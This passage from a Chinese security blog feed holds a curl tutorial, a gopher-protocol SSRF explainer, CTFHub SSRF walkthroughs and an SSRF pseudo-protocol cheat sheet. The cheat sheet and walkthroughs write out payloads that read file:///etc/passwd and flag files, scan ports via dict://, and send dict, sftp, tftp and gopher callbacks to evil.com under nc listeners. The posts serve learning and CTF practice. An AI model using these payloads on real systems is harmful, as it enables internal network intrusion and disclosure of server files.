        <content type="html"><![CDATA[<h1 id="curl使用"><a href="#curl使用" class="headerlink" title="curl使用"></a>curl使用</h1><p>curl是一个命令行工具，通过制定的URL来上传或下载数据，并将数据展示出来。curl中的c表示client，而URL就是url。</p><h2 id="命令行基础"><a href="#命令行基础" class="headerlink" title="命令行基础"></a>命令行基础</h2><h2 id="Verbose模式"><a href="#Verbose模式" class="headerlink" title="Verbose模式"></a>Verbose模式</h2><p>如果curl得到的结果不是期望的结果，我们可以使用<code>-v</code>或<code>--verbose</code>进入Verbose模式获取更多的信息。</p><ol><li>查看通信过程</li></ol><p>在Verbose模式中，curl会得到更多的对话式信息，帮助我们了解发生了什么。curl会在每一个信息前面加上*进行标识。在下面的例子中，我们将百度的首页保存下来（使用<code>-o</code>选项并指定参数<code>baidu</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v www.baidu.com -o baidu</span><br></pre></td></tr></table></figure><p>我们就可以得到如下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">* About to connect() to www.baidu.com port 80 (#0)</span><br><span class="line">*   Trying 14.215.177.39... connected</span><br><span class="line">* Connected to www.baidu.com (14.215.177.39) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2</span><br><span class="line">&gt; Host: www.baidu.com</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform</span><br><span class="line">&lt; Connection: Keep-Alive</span><br><span class="line">&lt; Content-Length: 2381</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Date: Fri, 14 Sep 2018 09:55:18 GMT</span><br><span class="line">&lt; Etag: &quot;588604dd-94d&quot;</span><br><span class="line">&lt; Last-Modified: Mon, 23 Jan 2017 13:27:57 GMT</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Server: bfe/1.0.8.18</span><br><span class="line">&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/</span><br><span class="line">&lt;</span><br><span class="line">&#123; [data not shown]</span><br><span class="line">103  2381  103  2381    0     0   113k      0 --:--:-- --:--:-- --:--:--  232k* Connection #0 to host www.baidu.com left intact</span><br><span class="line"></span><br><span class="line">* Closing connection #0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>在curl中，在使用<code>-i</code>选项可以显示Response的Header信息，连同Body数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i www.baidu.com</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 2381</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Date: Mon, 17 Sep 2018 10:26:42 GMT</span><br><span class="line">Etag: &quot;588604dd-94d&quot;</span><br><span class="line">Last-Modified: Mon, 23 Jan 2017 13:27:57 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Server: bfe/1.0.8.18</span><br><span class="line">Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta</span><br><span class="line">http-equiv=X-UA-Compatible content=IE=Edge&gt;&lt;meta content=always name=referrer&gt;&lt;link rel=styleshee</span><br><span class="line">t type=text/css href=http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css&gt;&lt;title&gt;百度一下，你就</span><br><span class="line">知道&lt;/title&gt;&lt;/head&gt; &lt;body link=#0000cc&gt; ... &lt;/body&gt; &lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用<code>-I</code>选项可以只显示Response的Header信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -I www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><code>POST</code>是HTTP中向服务端提交数据的一种方法。在浏览器中，但在表单中填写完数据后，浏览器就会默认将填写的数据使用<code>key=value</code>串的形式进行转化。在curl中，我们可以使用<code>-d</code>或<code>--data</code>选项来指定具体的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d key1=value1&amp;key2=value2 http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们也可以使用多个<code>-d</code>选项来指定多组数据，curl会自动把这些数据连接起来，因此上面的例子还可以这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d key1=value1 -d key2=value2 http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>在***HTTP方法***中我们可以通过具体的选项指定使用什么方法。这里我们也可以使用<code>-X</code>选项来进行指定：</p><p>Curl执行GET/POST/PUT/DELETE操作 hou</p><p>-X后跟指定的命令参数去执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://example.com</span><br><span class="line">curl -X PUT www.baidu.com </span><br><span class="line"></span><br><span class="line">curl -X DELETE www.baidu.com</span><br><span class="line"></span><br><span class="line">curl -X POST www.baidu.com </span><br><span class="line"></span><br><span class="line">curl -X GET www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="COOKies"><a href="#COOKies" class="headerlink" title="COOKies"></a>COOKies</h2><p>HTTP是一种无状态的协议，为了在会话中保存一些状态，可以使用Cookies。服务器通过<code>Set-Cookie:</code>来设置Cookie，客户端就可以在下一次请求中携带这些数据。</p><h3 id="1-设置Cookie"><a href="#1-设置Cookie" class="headerlink" title="1. 设置Cookie"></a>1. 设置Cookie</h3><p>我们可以使用<code>--cookie</code>选项来设置一个Cookie：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie &quot;CookieName=CookieValue&quot; http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-从文件中读取Cookies"><a href="#2-从文件中读取Cookies" class="headerlink" title="2. 从文件中读取Cookies"></a>2. 从文件中读取Cookies</h3><p>curl默认不会记住服务器设置的Cookie，也不会在下一次请求中携带Cookie。除非用户通过选项自己设置。</p><p>我们可以把之前的Cookies保存到一个文件，然后在下一次请求中指定curl读取文件中的Cookies：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b cookies.txt http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>-b</code>选项指定curl去给定的文件中读取Cookies。</p><p>不过要主要，这里仅仅是读取Cookies，如果这次请求中服务器修改了Cookie，那么curl是不会进行保存的，除非我们手动指定。</p><h3 id="3-写Cookies到文件"><a href="#3-写Cookies到文件" class="headerlink" title="3. 写Cookies到文件"></a>3. 写Cookies到文件</h3><p>我们可以使用<code>-c</code>选项指定curl保存这次请求中服务器设置的Cookies：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -c cookie.jar.txt http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有时，我们既需要从文件中读取Cookies，也需要保存服务器设置的Cookies。那么就可以同时使用<code>-b</code>和<code>-c</code>选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b cookies.txt -c cookie.jar.txt http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><code>curl</code>支持文件上传，上传文件时使用<code>-T</code>或<code>--upload-file</code>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -T ./index.html www.uploadhttp.com/receive.cgi</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gopher协议深度理解</title>
      <link href="/2021/08/25/Gopher%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/"/>
      <url>/2021/08/25/Gopher%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Gopher协议的深度理解"><a href="#Gopher协议的深度理解" class="headerlink" title="Gopher协议的深度理解"></a>Gopher协议的深度理解</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p><strong>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</strong></p><h2 id="限制"><a href="#限制" class="headerlink" title="限制:"></a>限制:</h2><p><img src="https://pic2.zhimg.com/80/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.png" alt="img"></p><h2 id="Gopher协议格式："><a href="#Gopher协议格式：" class="headerlink" title="Gopher协议格式："></a>Gopher协议格式：</h2><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间&amp;也需要进行编码</li></ul><p><strong>Gopher发送请求HTTP GET请求：</strong></p><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p>nc启动监听，监听2333端口：nc -lp 2333</p><p>使用curl发送http请求，命令为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl gopher:<span class="comment">//192.168.0.119:2333/abcd</span></span><br></pre></td></tr></table></figure><p>此时nc收到的消息为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333</span><br><span class="line">bcd</span><br></pre></td></tr></table></figure><p>可以发现url中的a没有被nc接受到，如果命令变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd</span><br></pre></td></tr></table></figure><p>此时nc收到的消息为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">margine:~ margin$ nc -lp 2333</span><br><span class="line">abcd</span><br></pre></td></tr></table></figure><p>所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）</p><p>那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：</p><blockquote><p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p></blockquote><p>我准备了一个PHP的代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个GET型的HTTP包，如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/base/get.php?name=Margin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.109</span><br></pre></td></tr></table></figure><p>URL编码后为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure><p>在转换为URL编码时候有这么几个坑</p><blockquote><p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p></blockquote><p><strong>Gopher发送请求HTTP POST请求：</strong></p><p>发送POST请求前，先看下POST数据包的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></table></figure><p>那我们将上面的POST数据包进行URL编码并改为gopher协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></table></figure><p>post.php的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用curl发起gopher的POST请求后，结果为：</p><p><img src="https://pic2.zhimg.com/80/v2-2a42359e724822587a8f7026b9481d61_720w.jpg" alt="img"></p><p>根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] &quot;POST /ssrf/base/post.php HTTP/1.1&quot; 200 7</span><br><span class="line">192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] &quot;name=Margin&quot; 501 213</span><br><span class="line">[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin</span><br></pre></td></tr></table></figure><p>这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">host:192.168.0.109</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=Margin</span><br></pre></td></tr></table></figure><p>现在我们将它进行URL编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A</span><br></pre></td></tr></table></figure><p>再次发送请求的结果为：</p><p><img src="https://pic4.zhimg.com/80/v2-571b29ad1c7922b652a783160e5a8d77_720w.jpg" alt="img"></p><p>发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF题目部分</title>
      <link href="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/"/>
      <url>/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p><strong>考点</strong>：用Gopher协议构造post请求。</p><p>首先，进入题目之后。我们用常用的思路，访问一下flag.php文件</p><p>我们可以看见有一个debug的key值，我们先纪律一下。</p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/5.png"></p><p>然后我们使用本地的访问看看是否有403.php,index.php,flag.php，并且看看源码，一般web目录为var/www/html/</p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/6.png"></p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/6.png"></p><p>然后我们看见index.php源码中有一系列的curl函数，可以使用访问，然后这里我们就需要用gopher协议构造一个post数据包</p><p>这里开始就要注意post数据包的一个特殊的点：</p><ol><li>需要两次编码</li><li>在第一次编码过后，我们就需要将%0a换成%0d%0a</li><li>在构造gopher时需要在url后一项加一个任意符号。</li></ol><p>然后构造出来是这样的，然后用bp上传就ok了。</p><p><img src="/2021/08/25/SSRF%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-ctfhub题目（部分）</title>
      <link href="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHUB-SSRF题目"><a href="#CTFHUB-SSRF题目" class="headerlink" title="CTFHUB SSRF题目"></a>CTFHUB SSRF题目</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p><strong>考点</strong>：SSRF远程访问主机中的文件</p><p>进入题目之后是这样的无显示。</p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/1.png"></p><p>然后我们根据题目提示，说访问127.0.0.1的flag.php文件，我们注意看url栏在<strong>url栏</strong>后面是空白的，然后我们就添加127.0.0.1/flag.php，然后访问，就得到flag了。</p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/2.png"></p><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p><strong>考点</strong>：伪协议读取本地的文件</p><ol><li>首先我们要知道在ssrf中常用的伪协议有哪些？比如file:///、dict://、sftp://…</li><li>我们要知道一般本地web的目录，一般是这样的var/www/html/…</li></ol><p>这样我们进入题目进入题目之后也是这样的无显示，并且url栏是空着的，这个时候我们就可以添加上面的东西这样添加</p><p><code>?url=file:///var/www/html/flag.php</code></p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/3.png"></p><p><strong>题后总结</strong>：我们要知道file:///可以冲文件系统中获取文件。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>考点</strong>：主要考dict：//伪协议的使用</p><p>进入题目之后我们可以看到也是一个无显示的网页，url需要填写，这里我们根据提示，访问端口在8000-9000，然后我们就用这样填写url</p><p><code>?url=dict://127.0.0.1:8000</code></p><p>然后用bp对8000进行数字爆破，爆破数字段from8000to9000 step1</p><p>然后就得到flag了</p><p><img src="/2021/08/24/SSRF-ctfhub%E9%A2%98%E7%9B%AE%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF伪协议</title>
      <link href="/2021/08/24/SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/08/24/SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF伪协议"><a href="#SSRF伪协议" class="headerlink" title="SSRF伪协议"></a>SSRF伪协议</h1><h2 id="一、类型"><a href="#一、类型" class="headerlink" title="一、类型"></a>一、类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:///    (切记三个杠)</span><br><span class="line">dict://</span><br><span class="line">sftp://</span><br><span class="line">ldap://</span><br><span class="line">tftp://</span><br><span class="line">gopher://</span><br></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>这种URL Schema可以尝试从文件系统中获取文件：</p><p><code>http://example.com/ssrf.php?url=file:///etc/passwdhttp://examle.com/ssrf.php?url=file:///c:/Windows/win</code></p><p>如果服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的UTL Schema就可以绕过这些限制：</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h3><p>这中URL Schema能够引用允许通过DICT协议使用的定义或单词列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure><p><strong>sftp://</strong></p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File  Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/ </span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*] </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure><p><strong>ldap://或ldaps:// 或ldapi://</strong></p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>tftp://</strong></p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET </span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>gopher://</strong></p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</span><br><span class="line"></span><br><span class="line">&lt;?php  header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/2021/08/23/SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/08/23/SSRF%E6%BC%8F%E6%B4%9E/</url>
      
